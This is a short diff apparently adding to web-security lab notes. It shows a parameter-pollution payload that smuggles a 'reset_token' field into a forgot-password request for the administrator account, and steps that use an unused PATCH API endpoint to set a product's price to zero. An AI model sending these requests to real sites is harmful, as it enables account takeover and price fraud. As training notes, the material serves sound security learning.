@@ -20,3 +20,23 @@ POST /forgot-password
 csrf=EOaA9KP0jcmyGMZ9SJcknOViH7bSKzS5&username=administrator%26field=reset_token%23
 ```
 
+# Finding and exploiting an unused API endpoint
+
+OPTIONS /api/products/1/price
+
+Allow: GET, PATCH
+
+PATCH /api/products/1/price
+
+"error":"Only 'application/json' Content-Type is supported"
+
+Add Content-Type: application/json
+
+"error":"'price' parameter missing in body"
+
+```json
+{
+  "price":   0
+}
+```
+
